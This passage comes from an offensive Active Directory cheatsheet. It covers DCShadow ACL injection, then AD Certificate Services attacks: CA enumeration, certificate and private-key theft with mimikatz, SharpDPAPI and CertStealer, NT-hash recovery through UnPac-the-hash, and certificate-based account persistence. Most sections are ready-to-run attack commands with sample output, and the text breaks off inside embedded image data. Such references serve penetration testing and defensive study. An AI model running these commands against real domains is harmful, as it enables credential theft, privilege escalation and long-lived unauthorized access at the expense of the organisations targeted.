<p id="bkmrk-for-the-target-user-">For the target user :</p>
<pre id="bkmrk-%28new-object-system.d-1"><code class="language-powershell">(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=user2,CN=Users,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
</code></pre>
<p id="bkmrk-for-the-site-contain">For the Site Container :</p>
<pre id="bkmrk-%28new-object-system.d-2"><code class="language-powershell">(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=domain,DC=local")).psbase.ObjectSecurity.sddl
</code></pre>
<h4 id="bkmrk-stack-the-queries">Stack the queries</h4>
<p id="bkmrk-after-have-get-the-a">After have get the ACLs and have appended the new ACEs for each one, we can stack the different queries to make a big DCShadow query<br>
For each one :</p>
<pre id="bkmrk-lsadump%3A%3Adcshadow-%2Fs"><code class="language-batch">lsadump::dcshadow /stack /object:&lt;object&gt; /attribute:ntSecurityDescriptor /value:&lt;newACL_after_the_append&gt;
</code></pre>
<p id="bkmrk-then-just-lsadump%3A%3Ad">Then just <code>lsadump::dcshadow</code></p>
<p id="bkmrk-dcshadow-can-now-be-">DCShadow can now be run from a user DCShadow-ed.</p>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-the-hacker-recipes-p"><li>
<a href="https://www.thehacker.recipes">The Hacker Recipes</a>
</li>
<li>
<a href="https://www.pentesteracademy.com">Pentester Academy</a>
</li>
<li>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md">PayloadAllTheThings</a>
</li>
<li>
<a href="https://swisskyrepo.github.io/InternalAllTheThings/">InternalAllTheThings</a>
</li>
<li>
<a href="https://pentestlab.blog/">Pentestlab.blog</a>
</li>
<li>
<a href="https://book.hacktricks.xyz/welcome/readme">HackTricks</a>
</li>
<li>
<a href="https://cheatsheet.haax.fr/">Haax</a>
</li>
<li>
<a href="https://www.ired.team">Red Teaming Experiments</a>
</li>
<li>
<a href="https://posts.specterops.io">SpecterOps</a>
</li>
<li>
<a href="https://www.mdsec.co.uk/knowledge-centre/research/">MDSec</a>
</li>
<li>
<a href="https://bloodhound.readthedocs.io/en/latest/index.html">BloodHound</a>
</li>
<li>
<a href="https://cube0x0.github.io">Cube0x0</a>
</li>
<li>
<a href="https://dirkjanm.io">Dirk-jan Mollema</a>
</li>
<li>
<a href="https://ppn.snovvcrash.rocks">Snovvcrash</a>
</li>
<li>
<a href="https://exploit.ph/">Exploit.ph</a>
</li>
<li>
<a href="https://blog.xpnsec.com/">Adam Chester</a>
</li>
<li>
<a href="https://medium.com/@oliverlyak">Olivier Lyak</a>
</li>
<li>
<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a>
</li>
<li>
<a href="https://z4ksec.github.io/posts/masky-release-v0.0.3/">Masky release</a>
</li>
<li>
<a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/">Active Directory Spotlight</a>
</li>
<li>
<a href="https://www.acceis.fr/ldap-pass-back-attack/">LDAP Pass back</a>
</li>
<li>
<a href="https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/">SOAPHound</a>
</li>
<li>
<a href="https://blog.slowerzs.net/posts/thievingfox/">ThievingFox</a>
</li>
<li>
<a href="https://www.hackthebox.com/">Hack The Box</a>
</li>
</ul>
                                    <div class="page-break"></div>
                    <div class="chapter-hint">Microsoft</div>
                    <h1 id="page-66">Active Directory Certificate Services</h1>
                    <p id="bkmrk-it-is-a-cheatsheet-a">It is a cheatsheet about the different AD-CS attacks presented by SpecterOps. All the references and resources for the commands and techniques will be listed at the end of the page, for acknowledgments and explains.
This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter <a href="https://twitter.com/BlWasp_"><strong>@BlWasp_</strong></a>.</p>
<p id="bkmrk-i-will-try-to-put-as">I will try to put as many links as possible at the end of the page to direct to more complete resources.
Many commands are more explained <a href="https://www.thehacker.recipes/ad/movement/ad-cs">here</a>, where I have participate for AD-CS.</p>
<h2 id="bkmrk-is-there-a-ca-%3F">Is there a CA ?</h2>
<p id="bkmrk-find-the-cert-publis">Find the <strong>Cert Publishers</strong> group :</p>
<ul id="bkmrk-from-unix-like-syste"><li>From UNIX-like systems: <code>rpc net group members "Cert Publishers" -U "DOMAIN"/"User"%"Password" -S "DomainController"</code>
</li>
<li>From Windows systems: <code>net group "Cert Publishers" /domain</code>
</li>
</ul><p id="bkmrk-find-the-pki-and-enu">Find the PKI and enumerate the templates and configurations from Linux:</p>
<pre id="bkmrk-netexec-ldap-%27domain"><code class="language-bash">netexec ldap 'domaincontroller' -d 'contoso' -u 'user' -p 'password' -M adcs
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP'
</code></pre>
<p id="bkmrk-find-the-ca-from-win">Find the CA from Windows:</p>
<pre id="bkmrk-certutil--config----"><code class="language-powershell">certutil -config - -ping
Certify.exe cas
Certify.exe find
</code></pre>
<p id="bkmrk-enumerate-the-http-p">Enumerate the HTTP ports on the servers, enumerate the shares to find <strong>CertEnroll</strong>, etc.</p>
<h2 id="bkmrk-certificate-theft">Certificate Theft</h2>
<h3 id="bkmrk-export-user-certific">Export user certificates with Crypto APIs - THEFT1</h3>
<p id="bkmrk-with-a-session-on-a-">With a session on a machine as a user, it is possible to export his certificate from the Windows Certificate Manager. With an interactive session and if <strong>the private keys are exportable</strong> :</p>
<p id="bkmrk-certmgr.msc--%3E-all-t"><code>certmgr.msc -&gt; All Tasks → Export...</code> to export a password protected .pfx file.</p>
<p id="bkmrk-with-powershell-%3A">With PowerShell :</p>
<pre id="bkmrk-%24mypwd-%3D-convertto-s"><code class="language-powershell">$mypwd = ConvertTo-SecureString -String "Password123!" -Force -AsPlainText
Export-PfxCertificate -Cert cert:\currentuser\my\&lt;CERT_THUMBPRINT&gt; -FilePath ./export.pfx -Password $mypwd

#Or with CertStealer
#List all certs
CertStealer.exe --list

#Export a cert in pfx
CertStealer.exe --export pfx &lt;CERT_THUMBPRINT&gt;
</code></pre>
<p id="bkmrk-if-the-capi-or-cng-a">If the CAPI or CNG APIs are configured to block the private key export, they can be patched with Mimikatz :</p>
<pre id="bkmrk-mimikatz-%23-crypto%3A%3Ac"><code class="language-batch">mimikatz # 
crypto::capi
privilege::debug
crypto::cng

crypto::certificates /export
</code></pre>
<h3 id="bkmrk-certificate-theft-vi">Certificate theft via DPAPI - THEFT2 &amp; 3</h3>
<h4 id="bkmrk-user-certificates">User certificates</h4>
<p id="bkmrk-with-the-master-key-">With the master key :</p>
<pre id="bkmrk-%23with-sharpdpapi-sha"><code class="language-powershell">#With SharpDPAPI
SharpDPAPI.exe certificates /mkfile:key.txt


#With Mimikatz
#Export certificate and its public key to DER
cd C:\users\user1\appdata\roaming\microsoft\systemcertificates\my\certificates\
./mimikatz.exe "crypto::system /file:43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8 /export"
	Key Container  : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab

#Find the master key (test them all until you find the good one)
./mimikatz.exe "dpapi::capi /in:ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad"
	pUniqueName        : te-CYEFSR-a2787189-b92a-49d0-b9dc-cf99786635ab #-&gt;good one
	guidMasterKey      : {f216eabc-73af-45dc-936b-babe7ca8ed05}

#Decrypt the master key
./mimikatz.exe "dpapi::masterkey /in:f216eabc-73af-45dc-936b-babe7ca8ed05 /rpc" exit
	key : 40fcaaf0f3d80955bd6b4a57ba5a3c6cd21e5728bcdfa5a4606e1bf0a452d74ddb4e222b71c1c3be08cb4f337f32e6250576a2d105d30ff7164978280180567e
	sha1: 81a2357b28e004f3df2f7c29588fbd8d650f5e70

#Decrypt the private key
./mimikatz.exe "dpapi::capi /in:\"Crypto\RSA\&lt;user_SID&gt;\ed6c2461ca931510fc7d336208cb40b5_cd42b893-122c-49c3-85da-c5fff1b0a3ad\" /masterkey:81a2357b28e004f3df2f7c29588fbd8d650f5e70" exit
	Private export : OK - 'dpapi_private_key.pvk'

#Build PFX certificate
openssl x509 -inform DER -outform PEM -in 43ECC04D4ED3A29EAEF386C14C6B650DCD4E1BD8.der -out public.pem
openssl rsa -inform PVK -outform PEM -in dpapi_private_key.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:bar -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre>
<p id="bkmrk-with-a-domain-backup">With a domain backup key to first decrypt all possible master keys :</p>
<pre id="bkmrk-sharpdpapi.exe-certi"><code class="language-powershell">SharpDPAPI.exe certificates /pvk:key.pvk
</code></pre>
<h4 id="bkmrk-machine-certificates">Machine certificates</h4>
<p id="bkmrk-same%2C-but-in-a-eleva">Same, but in a elevated context :</p>
<pre id="bkmrk-sharpdpapi.exe-certi-0"><code class="language-powershell">SharpDPAPI.exe certificates /machine
</code></pre>
<p id="bkmrk-to-convert-a-pem-fil">To convert a PEM file to a PFX :</p>
<pre id="bkmrk-openssl-pkcs12--in-c"><code class="language-bash">openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre>
<h3 id="bkmrk-finding-certificate-">Finding certificate files - THEFT4</h3>
<p id="bkmrk-to-search-for-possib">To search for possibly certificate and key related files with Seatbelt :</p>
<pre id="bkmrk-.%2Fseatbelt.exe-%22dir-"><code class="language-powershell">./Seatbelt.exe "dir C:\ 10 \.(pfx|pem|p12)`$ false"
./Seatbelt.exe InterestingFiles
</code></pre>
<p id="bkmrk-other-interesting-ex">Other interesting extensions :</p>
<ul id="bkmrk-.key-%3A-contains-just"><li>
<code>.key</code> : Contains just the private key</li>
<li>
<code>.crt/.cer</code> : Contains just the certificate</li>
<li>.<code>csr</code> : Certificate signing request file. This does not contain certificates or keys</li>
<li>
<code>.jks/.keystore/.keys</code> : Java Keystore. May contain certs + private keys used by Java applications</li>
</ul><p id="bkmrk-to-find-what-the-cer">To find what the certificate can do :</p>
<pre id="bkmrk-%24certpath-%3D-%22.%5Ccert."><code class="language-powershell">$CertPath = ".\cert.pfx"
$CertPass = "Password123!"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
$Cert.EnhancedKeyUsageList

#Or with a pfx
certutil.exe -dump -v cert.pfx
</code></pre>
<p id="bkmrk-verify-if-a-found-ce">Verify if a found certificate is the CA certificate (you are really lucky) :</p>
<pre id="bkmrk-%23show-certificate-th"><code class="language-powershell">#Show certificate thumbprint
$CertPath = ".\cert.pfx"
$CertPass = "Password123!"
$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
$Cert.Thumbprint

#Verify CA thumbprint
certutil.exe find /quiet
</code></pre>
<p id="bkmrk-if-they-match%2C-it%27s-">If they match, it's good.</p>
<h3 id="bkmrk-ntlm-credential-thef">NTLM Credential Theft via PKINIT – THEFT5</h3>
<p id="bkmrk-when-a-tgt-is-reques">When a TGT is requested with PKINIT, the <strong>LM:NT hash</strong> is added in the structure <code>PAC_CREDENTIAL_INFO</code> for futur use if Kerberos is not supported, and the PAC is ciphered with the krbtgt key. When a TGS is requested from the TGT, the same structure is added, but ciphered with the session key.</p>
<p id="bkmrk-the-structure-can-be">The structure can be unciphered if a TGS-REQ U2U is realised. It's called <strong>UnPac-the-hash</strong>.</p>
<h4 id="bkmrk-windows">Windows</h4>
<pre id="bkmrk-rubeus.exe-asktgt-%2Fg"><code class="language-powershell">Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
</code></pre>
<h4 id="bkmrk-linux">Linux</h4>
<pre id="bkmrk-%23-authenticate-and-r"><code class="language-bash"># Authenticate and recover the NT hash
certipy auth -pfx 'user.pfx' -no-save
</code></pre>
<h2 id="bkmrk-account-persistence">Account Persistence</h2>
<h3 id="bkmrk-user-account-persist">User account persistence - PERSIST1</h3>
<p id="bkmrk-with-a-user-account-">With a user account control on a domain machine, if a template that allows <strong>Client Authentication</strong> is enabled, it is possible to request a certificate that will be valid for the lifetime specified in the template even if the user changes his password.</p>
<h4 id="bkmrk-windows-0">Windows</h4>
<pre id="bkmrk-certify.exe-request-"><code class="language-powershell">Certify.exe request /ca:CA.contoso.local\CA /template:"Authentication Template"
</code></pre>
<h4 id="bkmrk-linux-0">Linux</h4>
<p id="bkmrk-if-the-user%27s-passwo">If the user's password is known:</p>
<pre id="bkmrk-certipy-req--u-%27user"><code class="language-bash">certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Authentication Template'
</code></pre>
<h3 id="bkmrk-machine-account-pers">Machine account persistence - PERSIST2</h3>
<p id="bkmrk-with-a-machine-accou">With a machine account control, if a template that allows <strong>Client Authentication</strong> is enabled for the computers, it is possible to request a certificate that will be valid for the lifetime specified in the template even a password modification, a system wipe or whatever (if the machine hostname remains the same).</p>
<h4 id="bkmrk-windows-1">Windows</h4>
<pre id="bkmrk-certify.exe-request--0"><code class="language-powershell">Certify.exe request /ca:CA.contoso.local\CA /template:"Authentication Template" /machine
</code></pre>
<h4 id="bkmrk-linux-1">Linux</h4>
<p id="bkmrk-if-the-machine%27s-has">If the machine's hash is known:</p>
<pre id="bkmrk-certipy-req--u-%27mach"><code class="language-bash">certipy req -u 'machine@contoso.local' -hashes ':&lt;hash_NT&gt;' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Authentication Template'
</code></pre>
<h3 id="bkmrk-account-persistence-">Account persistence via Certificate Renewal - PERSIST3</h3>
<p id="bkmrk-the-renewal-period-o">The <strong>renewal period</strong> of a template indicates the timeframe before the certificate expiration where the user can manually renew his certificate.</p>
<p id="bkmrk-the-attacker%2C-howeve"><em>The attacker, however, can renew the certificate before expiration. This can function as an extended persistence approach that prevents additional ticket enrollments from being requested, which can leave artifacts on the CA server itself.</em></p>
<h2 id="bkmrk-domain-privesc">Domain Privesc</h2>
<h3 id="bkmrk-template-attacks---e">Template Attacks - ESC1, 2, 3, 9, 10, 13, 14, 15</h3>
<p id="bkmrk-"><a href="https://hideandsec.sh/uploads/images/gallery/2021-12/mlK5E1SH1D1CzLOG-image-1640805125672.png"><img src="data:image/png;base64,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